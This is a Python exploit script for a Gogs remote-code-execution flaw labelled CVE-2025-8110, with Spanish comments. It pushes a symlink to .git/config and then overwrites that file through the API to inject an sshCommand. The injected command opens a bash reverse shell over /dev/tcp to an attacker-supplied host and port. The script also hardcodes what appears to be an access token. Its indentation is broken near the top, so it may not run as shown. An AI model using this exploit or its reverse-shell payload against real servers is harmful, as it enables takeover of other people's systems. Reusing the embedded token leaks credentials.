#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Gogs CVE-2025-8110 Exploit
Remote Code Execution via .git/config symlink bypass

Author: Ghxstsec
Version: 1.0
"""

import argparse
import requests
import os
import subprocess
import shutil
import urllib3
from urllib.parse import urlparse
import base64
from bs4 import BeautifulSoup
from rich.console import Console
import urllib.parse

# ====================== BANNER ASCII ======================
console = Console()

console.print(r"""
[bold red]
   _____ _____   _____ 
  / ____|  __ \ / ____|
 | |  __| |__) | |  __ 
 | | |_ |  _  /| | |_ |
 | |__| | | \ \| |__| |
  \_____|_|  \_\\_____|
                       
[bold yellow]CVE-2025-8110[/bold yellow] - Gogs Remote Code Execution
[bold cyan]Authenticated RCE via Symlink + sshCommand Injection[/bold cyan]
[/bold red]
""")

console.print("[bold white]Author : ghxtsec[/bold white]")
console.print("[bold white]Based on: zAbuQasem original PoC[/bold white]")
console.print("[bold white]------------------------------------------------[/bold white]\n")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://localhost:8080",
    "https": "http://localhost:8080",
}

  username = "user1"
  token = "052aeed0915d4f0ceb51e583e059e5cd302d275c" # You can find yours in your Gogs website Settings -> Applications -> Generate new token


def login(session, base_url, username, password):
    """Login con usuario existente."""
    login_url = f"{base_url}/user/login"
    resp = session.get(login_url)
    csrf = extract_csrf(resp.text)

    login_data = {
        "_csrf": csrf,
        "user_name": username,
        "password": password,
    }
    resp = session.post(
        login_url,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=login_data,
        allow_redirects=True,
    )
    if "user/login" in resp.url:
        console.print(f"[bold red]Login falló: {resp.status_code}[/bold red]")
        raise ValueError("Authentication failed")
    console.print("[bold green][+] Login exitoso[/bold green]")
    return session.cookies


def create_malicious_repo(session, base_url, token):
    """Crear repo usando el token que ya tienes."""
    api = f"{base_url}/api/v1/user/repos"
    repository_name = os.urandom(6).hex()
    data = {
        "name": repository_name,
        "description": "Malicious repo for CVE-2025-8110",
        "auto_init": True,
        "readme": "Default",
        "private": False,
    }
    session.headers.update({"Authorization": f"token {token}"})
    resp = session.post(api, json=data)
    console.print(f"[blue]Repo creation status: {resp.status_code}[/blue]")
    if resp.status_code not in (201, 200):
        console.print(f"[red]Error creando repo: {resp.text}[/red]")
        raise ValueError("Repo creation failed")
    console.print(f"[bold green][+] Repo creado: {repository_name}[/bold green]")
    return repository_name


def upload_malicious_symlink(base_url, username, password, repo_name):
    """Clone + symlink + commit + push (con URL encoding corregido)."""
    repo_dir = f"/tmp/{repo_name}"
    parsed_url = urlparse(base_url)
    base_path = parsed_url.path.rstrip("/")

    encoded_username = urllib.parse.quote(username, safe='')
    encoded_password = urllib.parse.quote(password, safe='')

    clone_url = (
        f"{parsed_url.scheme}://{encoded_username}:{encoded_password}@"
        f"{parsed_url.netloc}{base_path}/{username}/{repo_name}.git"
    )

    clone_cmd = ["git", "clone", clone_url, repo_dir]

    symlink_path = os.path.join(repo_dir, "malicious_link")

    try:
        if os.path.exists(repo_dir):
            shutil.rmtree(repo_dir)

        console.print(f"[blue]Clonando con URL: {clone_url}[/blue]")

        subprocess.run(clone_cmd, check=True, capture_output=True)
        
        os.symlink(".git/config", symlink_path)

        subprocess.run(["git", "add", "malicious_link"], cwd=repo_dir, check=True)
        subprocess.run(["git", "commit", "-m", "Add malicious symlink"], cwd=repo_dir, check=True)
        subprocess.run(["git", "push", "origin", "master"], cwd=repo_dir, check=True)

        console.print("[bold green][+] Symlink subido y pusheado correctamente[/bold green]")
    except subprocess.CalledProcessError as e:
        error_msg = e.stderr.decode() if e.stderr else str(e)
        raise ValueError(f"Git command failed: {error_msg}") from e
    except Exception as e:
        raise ValueError(f"Error en upload_symlink: {e}") from e


def exploit(session, base_url, token, username, repo_name, command):
    """Enviar el overwrite del .git/config vía API."""
    api = f"{base_url}/api/v1/repos/{username}/{repo_name}/contents/malicious_link"
    data = {
        "message": "Exploit CVE-2025-8110",
        "content": base64.b64encode(command.encode()).decode(),
    }
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json",
    }
    resp = session.put(api, json=data, headers=headers, timeout=10)
    console.print(f"[blue]Exploit status: {resp.status_code}[/blue]")
    if resp.status_code in (200, 201):
        console.print("[bold green][+] Exploit enviado correctamente. ¡Revisa tu listener![/bold green]")
    else:
        console.print(f"[bold red][-] Exploit falló: {resp.text}[/bold red]")


def extract_csrf(html_text):
    soup = BeautifulSoup(html_text, "html.parser")
    token_input = soup.select_one("input[name=_csrf]")
    if token_input and token_input.get("value"):
        return token_input.get("value")
    raise ValueError("CSRF token not found")


def main():
    parser = argparse.ArgumentParser(description="Gogs CVE-2025-8110 Exploit")
    parser.add_argument("-u", "--url", required=True, help="Gogs base URL (ej: http://target.com:3000)")
    parser.add_argument("-lh", "--host", required=True, help="Tu IP para reverse shell")
    parser.add_argument("-lp", "--port", required=True, help="Tu puerto para escuchar")
    parser.add_argument("-x", "--proxy", action="store_true", help="Usar proxy local")
    parser.add_argument("-p", "--password", required=True, help="Password del usuario pwnuser")
    args = parser.parse_args()

    session = requests.Session()
    if args.proxy:
        session.proxies.update(proxies)
    session.verify = False

    command = f"bash -c 'bash -i >& /dev/tcp/{args.host}/{args.port} 0>&1' #"

    try:
        login(session, args.url, username, args.password)
        repo_name = create_malicious_repo(session, args.url, token)

        git_config = f"""[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
  sshCommand = {command}
[remote "origin"]
	url = git@localhost:gogs/{repo_name}.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
"""

        upload_malicious_symlink(args.url, username, args.password, repo_name)
        exploit(session, args.url, token, username, repo_name, git_config)

    except Exception as e:
        console.print(f"[bold red][-] Error: {e}[/bold red]")

if __name__ == "__main__":
    main()
